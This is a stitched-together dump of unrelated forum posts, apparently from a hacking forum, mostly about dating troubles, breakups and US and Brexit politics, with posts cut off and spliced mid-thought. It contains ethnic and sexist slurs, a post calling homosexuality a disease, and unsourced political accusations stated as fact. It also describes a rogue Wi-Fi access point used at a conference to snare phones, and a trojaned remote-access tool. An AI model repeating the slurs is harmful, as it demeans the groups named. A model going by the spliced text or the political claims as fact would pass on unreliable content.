44552368,"Hello There,
I have been working hard from past 1 year to earn good amount of money so I never thought about the relationship. But today there was a party at school and I realized that most of the girls were with guys that were jerks. (They were not even looking hot) I was the guy who was more handsome than those guys, but still no girl even cared to come near me.
Today I decided that within the next 6 months i'll be working hard to become the guy girls actually want. So, Is there any girl who care to tell me what types of guys girls want? If the girls need hand some guys then i'll be working hard to become more attractive and if girls need a bad guy than ill become the bad guy. The thing is, what type of guys girl wants?

Edit: Many people are saying that I look like a 12 year old dumb kid, But I'm not a kid. As I already told that all I used to care about was money, I did not care about girls and love before but now I think I should get girls. 

Some questions to girls:

I digress a lot which is why I hate writing essays and assignments of that sort. See, another digression within one's self. They don't divide they seem to infinitely multiply.

On a grander scale of things i'll cock a lot of racial inequality [and inequality in itself] to ignorance. I'm not a tree loving hippy who preaches for world peace but I do believe if there was a greater understanding of one another there may be some clarity and that the results would be the epitome of surprising. The rest would have to go to stupidity or the fact some people just do not give a single linear fuck.

Of course I am speaking for myself as I cannot predict/dictate what the next man/women beside me is into [for a lack of a better word]. As someone who grew up in a very open, ""shoot the shit"" family environment I was taught to essentially learn for myself [in terms of preference and attraction]. Albeit many of this 'learning' has been through porn there is some transparency that has come out of all of it [as well as real time]. I have found that brunettes are more appealing to me than blondes. That orientals are just as, if not prettier than Caucasians. Black girls which are like an unspoken, forbidden fruit to white guys [or as it appears to me] are surprisingly pretty than often said.

I guess you win if you are going to argue that superiority at its most basic level is believing one thing is better than another; but with such a stingy topic I like to think it is more symbolic than that [superiority and the word ""superior"" as a whole]. After all this time I can't even remember how we got onto the topic of racism. Regardless of that I still believe that sexuality [with respect to all its 'sub sections', once again for a lack of a better word] is a very touchy construct and that any added criticism is not necessary.

With the above being said I still feel as if offence is only justifiable if the intent was to harm and the context is even somewhat relevant."

If you're intentions are to actually date her again and not bang her then I would advise you to confront and open up to her. Just flat out ask her out, preferably in person. You could always take it slow and ask to go see a movie. Or just take her out to dinner.

I drove 2 hours to come and see my ex today (we live together but i've been spending time elsewhere). I sent her approx 10 text messages the other night and she blocked my number on her iPhone. Now I know that it sounds like i'm pestering her, but I just had a long message so I had to break it down into 10 paragraphs.

Anyway.... In order to try and save our 3.5 year relationship, which at the moment, is in pieces, I went to the store and bought her some flowers and a bottle of her favourite drink. I've been awake since 4:30am today because I couldn't sleep. I wrote a list of all the things I did wrong that screwed with her emotions.... One last thing, she has got a 13 hour night shift she's about to do...

So I drive up and go into my bedroom. I put a fresh white shirt on, with a blazer and I spray myself with a nice spray she got me a while back. I prepared my speech and got the flowers ready to hand over to her. I tell her that I suffered with depression, I got fat and I had to work hard in order to get back to normal etc. She listens to EVERYTHING....then gives me the flowers and says that the guy hasn't been texting anymore, probably because of what I said to him when I flipped out. Then she says: ""I want to be alone, can you put the flowers in a vase?"".

So I switch up my tactics. I start playing the hot guy in the club, the one who is smiling, confident etc. I make her laugh and I end up giving her a hug (she lets me). I now leave her to sleep and go and grab some food from the kitchen. 2 hours later, I shout into her room and asks if she wants a ride to work. She starts shouting at me, getting REAL mad, saying that she hasn't slept because I have been making a noise in the house.

She gets a shower and gets ready for work. She leaves her phone on the table but I resist the urge to pick it up because she WOULD DEFINITELY see me. I wanted to see if it's true and she hasn't messaged this guy (from my previous thread).

She ends up saying she'll get the bus to work, but I say take care and I tell her to unblock me and make her smile and laugh a bit again.

Where is this going? I hate the games. I just wanna know if she's gonna sort this shit out or play games. Her mood swings are absolutely destroying me as a man. I cannot physically cope with them. In the first year of the relationship, we were fantastic. In the 2nd and 3rd years, it has became very difficult... Can this be fixed guys? 

FYI: me and the girl are both 25 yrs old."

Well technically the age difference isn't that major, I would definitely be fine with it as long as they were really in a physical relationship, and if he wasn't an asshole to her. 

But again, I will never condone the use of illegal means to get back at this individual, and the only real help you'll be able to do for her is to inform the police. 

She may be afraid of him, but almost all relationships which one party abuses the other is the same, if they weren't scared they wouldn't be stuck in that relationship in the first place."

she got a positive result on the first test but it was expired since June 2014
she's taking another one from the pack tomorrow. if that's positive, we're gunna go buy a million more. 

holy crap guys.

Back story ***LINK***(Click to View)[javascript:void(0);]***LINK***Serious replies only guys. No tl;dr so read it all or don't reply. 

Okay so, I've been dating a girl for quite some time now (over a year). We're both over-age, graduated, have jobs and all that sha-bang. 

She takes the pill, I don't really ever use condoms. She's been on the pill for years though. 
We live together, plan on spending the rest of our lives together, etc. although we're not in the best place financially, but we're not bad and can get a lot better if she wasn't a lazybutt lol. 

Anyways, she's worried about it and it's starting to make me worry. 
Her symptoms are:
- increased hunger (like holy fuck)
- urination urge increasing, along with constipation (although she has colon problems to begin with)
- increased fatigue. She sleeps a lot normally, but we'll be in bed and playing games or watching tv and then she's just like ""k imma nap"" and that's really unlike her. She sleeps all day anyways. 
- Mood. Swings. Up. The. Ass. I do one wrong thing and she tries to tear me a new one. 
- super sensitive boobs to the point where shell barely let me touch them
- lower back pains, although she has issues with her back
- she got really sick for like a day last week?? Think it's food poisoning but idk. She'll feel sick after eating some stuff

And now, ""missed period"". This might be as TMI, but she's had a very light one. Bled the first day, practically nothing after that. Could be ""implantation bleeding"". Was accompanied by mild cramps. 

Idek, I think she is on one hand, and then on the other idk. Could just be her period. 
We've had a scare once before with similar ""symptoms"" and she got her cycle. 

Idk. What do you guys think? 
Also, if she is, we're undecided on what to do. But neither of us want to think about it too much cus if we get excited for it and she's not, then that's disappointing lol. 

If any of you have kids, what was the first few weeks of her pregnancy like? All of them are different, but just need some perspective. 

Thanks guys."

Code:
***CODE***[Met jouw onverbeterlijke looks en praatjes zo glad als een pas geboende vloer, vallen de vrouwen als vliegen voor je charmes. Als jij een avondje gaat stappen, moet je de dames letterlijk van je af slaan. Erg vervelend voor je vrienden die het met heel wat minder vrouwelijke aandacht moeten stellen!

In bed ben je een minnaar waar de schrijver van de Kama Sutra nog een lesje van zou kunnen leren. Het is alleen doodzonde dat je per avond slechts één tot drie vrouwen de nacht van hun leven kan bezorgen. Al de rest moet met een beteuterd gezicht en een broek vol goesting de aftocht blazen. Was er maar een manier om al deze vrouwen gelukkig maken... !

Je gebeden zijn eindelijk verhoord want met de Clone-A-Willy creëer je zoveel exacte kopieën van je toverstok als je aanbidsters hebt. In een handomdraai knutsel je de (ongetwijfeld) beste en meest bevredigende dildo ter wereld ineen. Om haar ervaring met jouw penis levensecht te maken, wordt een kleine vibrator bijgeleverd die je kan vastmaken aan de dildo. Zo laat je de dames (wederom) trillen van plezier!]***CODE***

Google translate because i cba to translate it:

""With your inveterate looks and talks as smooth as a freshly polished floor, the women fall like flies for your charms. If you are going out for a night, you have to beat off the ladies literally you. Very annoying for your friends who have to make do with a lot less female attention!

In bed you're a lover where the author of the Kama Sutra another lesson of could learn. It's just a shame that you have a night just one to three wives can provide the night of their lives. All the rest have a crestfallen face and a pants full enthusiasm to retreat. If only there was a way to make all these women happy ...!

Your prayers have finally been answered because the Clone-A-Willy, you create as many exact copies of your wand if you have admirers. In no time you craft the (arguably) best and most satisfying dildo world collapsed. Her experience to make your penis life really is a small vibrator provided that you can attach to the dildo. So let the ladies (again) quiver of fun!""

If I didn't just get a promotion at work then I would be more then happy to take off.

I have survival instincts and although its winter time I would love to just pack my 35 Gallon backpack with some warm clothes a sleeping bag and some ammo and head out into the wild with nothing buy what I bring in my bag.(Probably a few days worth of food at least I would have to bring. My roommate is a cop so I wouldn't have to worry about anyone turning me in as a missing person as long as I told him I would be back in a few days.

I just got a management position at work though so the chance of me being able to just take off is little to none. I wish I could though.

Right now I feel lost and confused. I wish I knew what to do but I don't know how to chance the feelings that I am having.

I mean as time passes I feel a lot better but for the most part it is just another day in a pointless and useless life.... Okay, not pointless and useless but it feels like that right now.

Who knows but maybe I feel like this because I wish to much that the past was the present. There are a lot of things in my past that made me happy, that made me feel, that made me successful. Right now though, my life is pretty dull. I don't have much of anything and I don't know when that is going to change... I lost everything several years ago and hadn't been able to really recover much at all.

Heck yea! Bob Marley is always a great chill out and relaxing music to listen to. I do that sometimes...

I will be honest though. The girl I like isn't really wanting to talk to me right now. We had a thing and wanted to have a relationship but when we looked at how different our values, morals, and belief's were we realized how difficult it would be to pursue anything. We said goodbye and hadn't really hung out since then. We have talked a little but for the most part we don't have anything anymore. It has been about a month since we split up and I am still having trouble letting go.

When I think about here I get butterflies in my stomach and feel all shaky and weird... Ugh, don't even say it because I know what you are thinking. 

I should probably tell you that its been 5 years since I dated anyone. I have had a few flings but nothing serious. I am kinda jaded... This girl although we decided to go our separate ways is someone that I hold dear as well as really like. There is a lot there that made me happy and our intelligence and interests match up to about the same. It was very easy to be happy around her but now... it just isn't the same.

After we decided to split up there was a time when we tried to hang out. It was horrible... it really was. I don't know what to do but I can't pursue anything from her.

Thanks for the input everyone. ***IMG***[images/smilies/blackhat.gif]***IMG***"
43735730,"Hey guys! I really need some advice. My boyfriends daughter had some bad stuff happen to her recently and my boyfriend filed a report to the police. Well, CPS (Child Protective Services) came and asked questions and stuff, and my boyfriend was forthright about myself and him being involved with smoking marijuana. He told the guy that he uses it for PTSD (Post Traumatic Stress Disorder from being in the military). My boyfriend also told the guy, that he was prescribed 17 different medications for anxiety, PTSD, blood pressure, etc. He said to the guy, that he didn't like taking them because of how they made them feel, and how marijuana has helped alleviate all of those problems.

We just got done smoking before the guy came and when he asked my boyfriend, it was thick in his voice that he knew that we did, that's why my boyfriend was truthful.

But like, I'm really scared that the cops are going to come and take his daughter away, and put me and him into jail for smoking it. -BTW I live in OH- Like, I really don't know what to do, and I need some advice from whoever is able to give it."

I have been in relationship 4 years, married for over 1 year. We had ups and downs, we broke up 3 times over the period we were together.  But we always tried to solve it as soon as possible. In my relationship she is the one who always reached her hands our first. In your relationship it seems both of you have mind to be there for another. I would suggest you to reach out to her, if you don't want to lose her. In most cases it is misunderstanding that breaks couples and it is you that can choose to accept it or fight for it. Giving up is an option. 

I am really sorry to hear about your break up but if you truly believe you deserve her and don't want to live without her, try to fix it as soon as possible.  Talk, talk and talk. That's the only way to fix the problems. As of the dreams you have, like she wants to be 
Lawyer in NO and you want to be by country side. One of you make a compromise, i suggest you to do so, and as she sees you can do such things for her, she feels extremely grateful and in future one day she will feel the same and does something to give a way instead of what she wants. The important part is communicating.

We decided not to talk so technically it is over. I just don't know why I still feel this way... I feel like I have no will to carry on. I feel like there is no point to life anymore.

I am not suicidal, that is just the best way I can explain the feeling I have right now.

I mean, currently I am listening to classic music that is talking about heartache and break. I feel like shit but I don't know what to do about it.

The biggest reason for our break up is that we have different religious views. She is agnostic and believes in no God and believe evolution is true and things like that.

I was raised in a Christian Home in the Southern Parts of the USA. I was raised to be a gentleman and with what I consider good morals. I was also taught right from wrong and to always be everything I can be.

The biggest thing is that she finds my faith as ignorant to the truth and I feel her ""truth"" to be possible, but not concrete.

I mean technically, we could both be wrong and we are really just all in the Matrix. I mean who knows... I guess death will answer those things but from what I believe and have faith in now is way different from her.

Another reason for the split is that she wants to be a lawyer in New York and I want to run a business and live in the Country or near a beach.

The things that we go well together on are the level of intelligence we both have. We are both very smart and powerful especially around other people. We seem to dominate conversations and when we went out together everyone commented on how lively we would make things and how we were a good couple.

The break up went like this. She was out of town for a week and we had talked about some of our differences before she left. When she got back I went to visit her and she told me we needed to talk about what we were and what we wanted out of life.

We agreed that life would be difficult if we stayed together and it would never work out.

That was that and we said our good byes and now we aren't talking or doing anything either.

She called me crying the other night and told me it was hard to not talk to me and that I was a really good person and she was amazed at how much I had changed her life and show her how to live. She said she missed me and wasn't sure how to stay away.

I didn't know what to say other then it was going to be okay and it was my pleasure to have influenced her life in a positive manner and that I hope that never changes.

We decided to continue to talk in the future but to let time pass between us before we continued communications.

Anyone have any thoughts? We were only seeing each other for a few months but I have this empty depressed feeling that is swallowing me and I hate it.

Thanks for any advice, and well just for being here to read my thoughts.

I totally agree on that being the best thing to do for my own good. In reality though, it simply is not going to happen because I can't stand to go without it. In this case, the 'little head' is doing the thinking rather than the 'big head'. I have decided to accept the fact that as a 17-year-old with raging hormones and and a not-fully-developed brain, I will inevitably make a jackass of myself at times and will have to deal with the consequences of falling in love just like every human experiences. Against what everyone has advised, I'm going to allow myself to have and pursue the feelings I have because I know I can't possibly resist. Maybe my 'pursuit' so to speak will turn out in my favor, maybe not, who the fuck knows. But I can tell you that no matter how things turn out, I will have learned a great deal from this experience and will hopefully be able to use it to my advantage in the future.

UPDATE: The usual flirting crap continues today. I saw her today for a couple hours. Zero distance between us, in fact she kept scooting closer to me. The same head-touching nonsense when looking at her phone (I know that I am guilty too.) And another thing, when I was showing her my hours on my phone, she leaned in excessively close and actually put her head on my shoulder for a few moments and rested it. Like I've said many times before, it was quite a thrill but it really doesn't help my case as far as falling for her. She gets me every time. BUT, I have decided that I'm going to tell her my situation without mentioning her. I texted her earlier today saying that I'm going to ask her for some advice on Friday and she said she'd give me advice. So I can't back out now unless I make up some bullshit excuse or something. I guess you could say progress is being made. Hopefully I don't fuck myself over."

43232363,"Hey Vince!  Sorry to hear about losing your girlfriend as I do know how temper can be the reasons for not only the loss of a girlfriend, but even close friends and relatives.  I'm not exactly sure if there is a reason to your temper as far as your daily ""bullshit"" or if there is something else that is bothering you and constantly on your mind, but if so you'll have to find a way to isolate it.

For example, if you're driving to work in the morning and for some reason everyone on the road is an asshole.  By that I mean driving under the speed limit, merging lanes without signaling, cutting you off, etc.  That's aggravating and can easily put a dent on your day, especially if you're suffering from yesterday's bullshit (whatever it may have been).  

Understand that every new day presents a new opportunity whether or not the outcome is good or bad.  The cause can be good and the effect can be bad.  The cause can be good and the effect can be good.  You can mix good and bad with either cause and effect and you'll never know until the actual even happens.

If you understand that concept, then maybe this is a bad cause, but could wind up good for you in the future.  Not saying ""there are more fish in the sea"" or any of those generic statements to get you to smile and look past this, but who knows if she will come back or not.  Only time will tell and your decisions inbetween those times will also determine it.  You shouldn't lay down and mope too long where it will affect your productivity in life.  I know grief is good at times and helps you let it out, but doing it too much will bring you down.

I know it's a completely different story and this thread is about you, but I lost my father 1.5 years ago and I still think about how I wish I had more experiences with him and was able to show him what kind of a man I could become, but instead he died before that and I felt like a failure to him since I wasn't anywhere that I wanted to be at the current time.  I know that I can't live like that as it's killed my relationship with friends, family, and even jobs.

You're a strong guy I'm sure and know how to carry responsibility since you're a Mentor here on HF and a previous Staff member.  I remember you and you're a very good person.  Just know that times like this will get better and with that state of mind, your temper will diminish in time as long as you stay dedicated to keeping a positive mindset.  You will struggle as we all do and I still do to this day.  Just know that there are ones that do love you and care about you and even as weird as it sounds, there are members here that have never met you and do care about your well-being.  Hopefully you can seek the personal motivation to cut your temper and move on to better things with your life.

Hey! My Wi-Fi’s up here!!!

Boobytrap Overview:
After seeing Ms. AmazonV’s “Tardis Corset” on display at ShmooCon 2016, we at WarCollar knew we wanted to see more. Lucky for us, she wanted something special for DefCon! The natural (and we do mean natural) option was to add a honeypot of another nature to this striking outfit, so we created the WarCollar ""BoobyTrap""

The WarCollar BoobyTrap is an embedded linux device (Omega Onion) using a couple of wireless interfaces to present commonly used access point SSIDs to anyone in close proximity. Devices in range that have previously associated with networks using these SSIDs will automatically connect. If the user tries to browse to a webpage, they will be redirected to a site reminding them of what poor choices they have made thus far in life (like leaving your WiFi on at DefCon).

The BoobyTrap keeps track of the devices that connect by MAC address and hostname. Don’t worry, this information is not being saved, we are just using it to shame those who bring a phone to a hacker conference and use it with reckless abandon. Remember boys, wrap it up!

Throughout the con, if you see the corset, check your phone to make sure you too haven’t fallen to one of the classic blunders. Ms. AmazonV will be carrying a special phone that will show the top Boobs in her trap and we will be compiling information on which SSID caught the most victims. Feel free to ask her to show you her BoobyTrap, though you may want to make sure she is actually wearing it before you ask. All in all, we really think that this corset and WarCollar make a nice pair."

He's already advocated spreading nuclear weapons to more countries, murdering civilians and committing war crimes, punishing any woman who gets an abortion, toss out the Geneva convention and torture people, withdraw from NATO, and ban an entire religion from the country, and create a database of muslims.
He said he would deport US citizens and thinks global warming is a hoax created by the chinese, thinks the US should default on its debt, defends the interment of Japanese Americans in WW2.
He thinks Obama is a muslim and accused him of not being american and accused him of being an ISIS sympathizer, insulted war heros because they got captured, racially insulted a sitting Senator. He bragged about his dick size in a GOP debate and has suggested he might quit if he's actually elected.
He consistently thinks women are only valuable for how they look, with at least a dozen high-profile misogynistic comments.
He's called nuking the middle east a plausible option. He has a suspicious number of ties to Putin, and has a history of business deals with organized crime. He's called mexicans rapists and criminals, been successfully sued multiple times for racist rental practices, and said he wants no blacks only jews counting his money.
He semi-threatened the pope, mocked disabled people in front of a crowd of thousands, outright threatened violence towards the media and protesters, made sexual comments about his daughters MULTIPLE TIMES, praised Kim Jong Un and Putin and Saddam Hussein, praised the Tianenmen Square massacre.
He's flirted with white supremacy - retweeting them, reposting their images with anti-semitic symbols, playing coy about David Duke's endorsement. He's a verified lunatic conspiracy theorist - he thinks the Clintons murdered one of their aides, Obama is a sleeper agent and Ted Cruz's dad helped kill JFK.
He could get caught diddling kids and funding ISIS himself and his supporters would eat it up. Either way, Ladies and Gentlemen, your Republican party nominee.

It's hard to predict what will happen, but one thing's for sure - Shit WILL be different. I'd rather have a chance of the country collapsing for the opportunity at true progression (politically and globally) than vote for Clinton who will quite literally keep everything the same, for the most part. edit: I don't love Trump, I don't love Clinton, but since only those 2 can viably win, I'm going for Donald. It pains me to say that, but at least he'll try to change the system a bit whereas Clinton won't. Clinton was too busy sucking up to other politicians to suck off Bill, and I'm assuming she'll continue to suck up to others instead of having her own ideas.

When he was sent messages from the FEC on many donations he is required by law to refund because they were from non us citizens or us citizens donating over the max amount he ignored the requests

He violated the law when his campaign hacked into the DNC and stole fundraising information from Hillary's campaign then the DNC kicked his access out for a few days and he cried OY GEVALT ITS ANUDDA SHOAH. His official statement was well we got into more RNC stuff and just to test how far the security breech went in we decided to check on Hillary's stuff and print it all out THIS WAS JUST TO SEE HOW FAR IT WENT.




He is a liar anyways there are threads all over reddit with people linking his votiong record contradicting his statements

BERNIE EVEN VOTED AGAINST GAY MARRIAGE IN 2008 IN VERMONT WHILE SCREAMING HOW HE LOVED GAY MARRIAGE WHEN TRYING TO GET RID OF DOMA.


His foreign policy is a complete shit show with defending Israel & voting for every single increase to military spending while screaming we spend too much on the military.

Bernie Sanders couldn't win in 88 then he got a check from the NRA & their support by promising to vote against the Brady bill once their check cleared and he won a few years later they didn't give him another check because his opponent was more pro gun & then he went super far left on guns & wanted to ban them.

While 51.3% of Brits voted for to leave, Brexit became a reality. This decision led to massive outbursts including the resignation of the Prime Minister of the country himself.

But one man, an immigrant of the British origin came up with the most innovative idea. He penned a beautiful post on Facebook asking Britain to forget everything and just come to India - and become her Union Territory.

BUT WAIT, what? Is this guy crazy? Not really he explains himself too :

""Whilst historically speaking it seems only right and proper to give India a chance to rule Britain for a few hundred years - it actually makes a lot of sense for the British too!

""Worried about jobs? India’s economy is growing 4x faster than Europe’s and will overtake the entire EU’s sometime in the 2030s - becoming twice the size of the EU economy by 2050

""Worried about the future of the NHS? India already provides nearly as many Doctors to the NHS as the EU does - and that doesn’t even include those of Indian origin, born or educated, in Britain. 25,055 Indian v 30,082 EU.

""Worried about diversity? With over 100 different languages spoken everyday and adherents of every religion - even Britain’s favourite materialist consumption - there truly is something for everyone here!

""Worried about being understood? English is one of India's two official languages - which will be a huge relief for all those have struggled to communicate with their continental neighbours for all these years.

""Worried about not being part of something bigger? India has more than twice the population of the EU. Half of which are under 35, so the bonus is no more worries about an ageing population!

""Worried about where to go on holiday? The Himalayas are nearly three times the height of the Alps and thousands of miles longer - there are more sandy beaches along India’s coastline than all the Costas you can dream of - and India has tropical rainforests and even a desert too! Plenty of visa free inter-railing adventures as well on the world’s largest railway network.

""Worried about not being ruled by an unlected bureaucracy in a far away land? We’ve got that covered as well! Nowhere on the planet has perfected the shuffling of paper and writing of rules better than New Delhi - what’s more India’s civil servants salaries are more than 10x lower than Brussels. Talk about getting more for less!

She's getting me a bunch of computer stuff and I feel terrible about it already but.. that's not really the issue. The issue is that there's this new girl that came to our school about a month ago, I was one of the first to start talking to her and we get along so well.. My girlfriend's kind of shy and I'm really outgoing and loud and so is the new girl. I have a lot of things in common with this new girl and we get along really well. She flirts with me and I kinda let it happen a little. She has a boyfriend and I have a girlfriend so it's kind of weird. I would NEVER cheat on my girlfriend but last night I had a dream that the new girl and I were hanging out and we started making out and doing stuff. I felt TERRIBLE about it and woke up in the middle of the night because of it. I'm not gonna lie I do like this new girl a little bit but I LOVE my girlfriend, I thought about it and even if I were to date the new girl I wouldn't be able to do a lot with her or take her around my family for a few months like I can with my girlfriend. I'm really close to my girlfriends family and she's close to mine.. I don't know what to do.

Long story short: My girlfriend and I have been dating for almost a year, a new girl came to school and we have a lot in common. She flirts with me and I let it happen sometimes. I had a dream last night about her and I and I regret it. I felt terrible. This new girl was everything I wanted in a girl before I met my girlfriend a year ago. I LOVE my girlfriend and the new girl has a boyfriend. Do my dreams mean something? What do I do? I don't want to lose my girlfriend.

EDIT: Sorry if this seems a little rushed, I'm trying to post this before I leave for school and I just typed what I was thinking as fast as possible."

A disability is never a choice (or almost never). I think he means a 'disability' in the context of 'not how it should be'. A man should be attracted to a female to create offspring. In the minds of homosexuals, there's something different that makes them attracted to the same sex. You could call that a disability or a 'disease' because a change in their brain makes homosexuals behave this way. So I understand why he'd call it a disease.

IMO from reading this I believe you're gay, which is ok.

BUT do not stress over your sexuality, for a long time I question my own, sometimes I still do but if I like someone, I like someone and that's that. Who cares nowadays? Only ignorant dumb asses get butt hurt over people being gay/bi etc.
Just remember, you have the rest of your life to figure yourself out so just go with the flow and get to know yourself a little bit better by trying new things.

Mr X is fucking disguisting, dont trust him. And also, maybe you already know, but dont download shit here on HF even if it is trusted members who does it. They have their own network, and they are just using this forum to spread their own shit to make some slaves. I cant even expect how much money they are making from this, and I have no idea how my old friend could rise this high.

An example is that they social engineered me by thinking Hmm, what is it that my old dear friend is seeking out the most... oh yeah, have a look at his posts. OH! He is looking for a RAT and he roams the hacking tools section... the genius as I am has now come up with a brilliant idea! Let me declare the latest Darkcomet being released as a beta, because he already knows darkcomet is the best RAT around.

So I admit I was a dumbfuck and downloaded the latest DC. Such an embarassment. But seriously though, something smelt fishy from the whole beginning, but I never followed my guts instinct.

Im really doubting if formatting will be a permanent solution from being free of viruses from them, but now Ive built a barricade inside my brain for this kind of mind hacking. Yes Yes I am easily tricked, and im ashamed that makes me look majorly stewpid. But rest assured, I am not in reality.

Here comes the important part, so listen carefully... WHAT. IS. THE. FIRST. THING. I. SERIOUSLY. SHOULD. CONSIDER. ONCE. IVE. FORMATTED. MY. PC. AND installed ubuntu on it. And what more can I do to protect myself. And to go a step further, what MORE above MORE can I DO to get my ass protected from gayrape.

I have been playing for almost 4 years now, and I have mastered many techniques with the Guitar ranging from Blues style music on to Heavy Metal techniques. For Hackforums users, this service is priced at 7 dollars an hour. Time for lessons are 100% customizable. Basically, you take your lessons when you want to take them. 4 am, 3 pm, doesn't matter to me. Yes, this is via webcam.


--Mental--

Relationship and Emotional support. While I do not have a degree in Psychology, I have studied and analyzed the human mind and it's methods of thinking. Nothing is truly what it seems to be. For this, I do free of charge. This is a service I wish to help the community with.

Advertisement

I am well known on these forums. I can easily post in one thread in the lounge and have 5 people click the link in my signature. For 3 dollars a week, 10 a month, I will advertise for you in my signature. Direct links are taken, it is your responsibility to create a Signature if you want me to host a signature for you.

--My inherited skill--

Lastly, I can increase the sales of your product(s) by stamping my name on your product. It's kind of like vouching, except you get the vouch, and on top of that, I can either Resell for you, letting you draw the profit (35/65, Me/You), or sell with you, maximizing both sides of profit. This varies depending on what you need done, your trust level, etc and etc.


I hope there is something here I can assist you with. I try to branch the largest miscellaneous items on the internet, compact them, master them, and sell them for the lowest anywhere.

If there is a service you'd like added, please post your ideas here, and I'll see what I can do.

42790984,"I am so sorry to hear of this happening to such a clearly nice guy. You can't keep on like this, amigo. You can't let women (or anyone for that matter) walk all over you. They will do it for the rest of your life if they feel they can get away with it.

Sometimes it's nice doing nice things for people, but you need to know where to draw the line also. Think before making such gestures. Are you doing it as you're genuine, or are you being walked all over? If the latter then give up on the idea. A resounding NO will get the message across that you're not a doormat.

I would seriously advise you cut away from this girl. She is obviously running rings around you. You need to find someone that appreciates you for you, and with a heart like yours I am sure you will. Just be careful.

Google will then list your profile including predicted gender, age and interests based on searches you have made and websites you have visited. Pretty sure it also gathers data from the videos you have watched on Youtube.

42547659,"In my opinion the strongest argument against the bible being the word of god or even a notion of what any god wants is that it's so obviously a product of its time and culture. It didn't bring change, it wasn't revolutionary, if a person of the era read the bible and decided to follow all its rules his or her life wouldn't be drastically changed. So this begs the question have we deserted the holiness of the rightful path of god or did these some desert nomads some two thousand years ago get it all wrong?

P.S. This doesn't really belong to innuendo since it hasn't got to do with sex or so."

If the issue with this is that her best friend is saying that she needs to dump you before talking, either the ""best friend"" is the one you need to confront about this relationship and how it concerns her... or the best friend is actually really into you and wants you to herself. It seems that she is playing the ""I want this, but I can't, so I have to interrupt it"" card. You need to talk to the best friend and ask why she said all of these things because this seems to me that this is where the problem lies. Don't let someone else dictate whether or not you can show affection for someone else, or whether or not you are allowed to date someone. They should stay out of it, unless you are a serial killer, which you probably aren't.

Talking about something that really gets your mind racing can really ignite a quality conversation if she is knowledgeable on the same thing. I find discussing music is the easiest conversation-starter, mainly because everyone listens to music and sharing your thoughts about a certain song or genre can lead to deeper conversations about how the lyrics ""speak"" to you.

Them sure are some white girl names. But I only saw girl #2s name once, hahaha. F for Effort, my man.

Because it wasn't just some jargon jizzed together. You used your big boy words and formed a creation that was actually very read worthy. Seriously though, if you like Sophia that much, you should stick with her. Disregard anyone that tries to ruin what you're going for, because in the end you're giving them the attention they want. 

Ironically attention seekers themselves have a short attention span and if that Sociopath Tiffany wants to put her Jew nose in your business, let it happen, just don't respond, as she'll get tired of waiting around and eventually move onto someone elses personal life to dismantle.

Adria, she's a timid soul. She seems like a girl that takes breakups and other emotional events to heart, she probably lost someone she liked, but she'll get over it.

Alas we arrive at the young Sophia, the woman that woman that has stolen your heart from HF. Like I said a few novels above, keep going for her, she's into you, why else would the news of you sleeping with Andria be such a shock resulting in her not responding for 2 days? That's the kind of thing ""the L word"" has on people, plus she's putting up with the drama that has arisen another one, no one Facetimes for 5 - 7 hours without liking the 2nd party.

Sadly I must bring my novel to an end. Although one does not need to listen to my words, just know that they are spoken from my own experiences and as a fellow UB3R would like to share what I think in hopes it will help you.

I read somewhere a list of top 10 craziest women names and guy names, and the #1 guy name was Nick and the top girl name was Tiffany.
I've honestly never met a Tiffany who was sane or rational. They've all been fairly off the charts, mostly extremely bipolar.
I've watched Tiffany get offended because her ex boyfriend high-fived her current boyfriend (all 3 were still good friends), and she threw a fit and walked off down the street like a quarter of a mile.
Explanation: She still wants her ex something fierce but he won't take her back so she stays with her current boyfriend, and gets offended when her attempts to make her ex jealous and to draw her ex back in fail miserably. Truth is, they always fail because he gives absolutely 0 fucks.
She does these childish fits to get attention because she knows someone will follow her, mainly because she only keeps around people that will follow her.
Sometimes it's sad that these people exist and that they have such a massive amount of control over their environments.
Well... At least, it's sad that people can't see through these individuals as quickly as they need to.

I appreciate the offer, but I almost never have social problems. I made this list of unofficial rules I follow to avoid drama and it's kept me away from drama for about 2 years until Adria showed up.
And on the rare occasions when I do experience drama I give myself advice as though I'm a stranger, because I'm really good at giving advice. So far it allows me to bypass those stupid filters we get that don't enable us the see situations as we should.

I had to post a thread this time, because even the unbiased advice giving side of me was tempted to bitch slap Tiffany.
Crazy women bro... Crazy women.

I'll extend your offer to yourself. Just message me if you need help with anything, I'll devote time to listen to your situation.
And I'll probably message you down the road just to chat anyways. Thank you for posting, I'm glad I got the opportunity to meet you. ***IMG***[images/smilies/blackhat.gif]***IMG***"

Comming from a guy that's dating a former prostitute (She wants to marry me ***IMG***[images/smilies/biggrin.gif]***IMG***) and feminist... and that has a feminist soulmate. I totally see where you are comming from. 

I think feminists actually has some substance and stand up for themselves. (the real ones, not the mysandric degenerate ones)
But of course, like in everything kind of ideologies/social movements... you always got those that go over the edge and are so full of themselves and believe they can treat/dominate man however they want because they classify themselves as a ""feminist"" (like OP's girlfriend). I didn't knew about feminazis, good to know.

And about rape, I think it's comming sens that it's wrong, and having a rape-fetish has nothing to do with this thread. Most rape-fetish like the article said are just that women crave a man that loses control other thir sexual arrousal and can't wait to put it in. But I don't think (Unless she has psychological issues of a degenerate) that women actually want to get forced into sex with a man she is repulsed/unconsented by. 

Blaming the girl to wear revealing clothes and get raped is basically the same as... blaming the owner of a sports car because it got stolen by a theft. Sure, you get learn some security tricks to lessen the odds of it happening to you... so imo both have a share of responsibility. A rape victim is like a car theft victim... on different scales of unmorality. Nobody has any idea how much a rape can damage a women... most of them end up turning to prostitution, and where I live, 1 in 5 gets a rape before the adult age. Sexual predators deserve to rot in hell, so girls... keep dressing sexy... or however you want, be yourself and never forget the social context and the risks that goes along with it. You know... parking your ferrari in the ghetto isn't the brigtest idea in the box."

Alright, my turn!

People shouting doesn't necessarily have to represent signs of anger. Don't feel bad because a mere voice turns out to pitch louder than another. I know this may sound bollock, and I'm fully aware that this isn't what you want to hear, but when you think about it, I'm sure you'll understand what I mean.

As for the girl.. Daisy is right about trying to approach her, but before you do that, it's time to adapt your body language to hers.
Don't approach her just yet. What you want to do is wait for her to walk in your direction, and then gently b ump into her. Touching shoulders lightly will instantly develop a connection between people and I can guarantee that she will look in your direction.

This is your shot. First you should carefully observe the look on her face. Is it anger? Better wait then. If she's showing signs of relaxation, such as lowered shoulders, then you've scored. Your image will now burn into her memory and you'll have more time to talk with her before you know.

A simple, ""Oh, I am terribly sorry for that. Hope I didn't hurt you."" is more than enough to get her attention. She will most likely reply with, ""It's okay."" and then walk ahead. But you'll have successfully established a first, positive connection between the two of you. :)

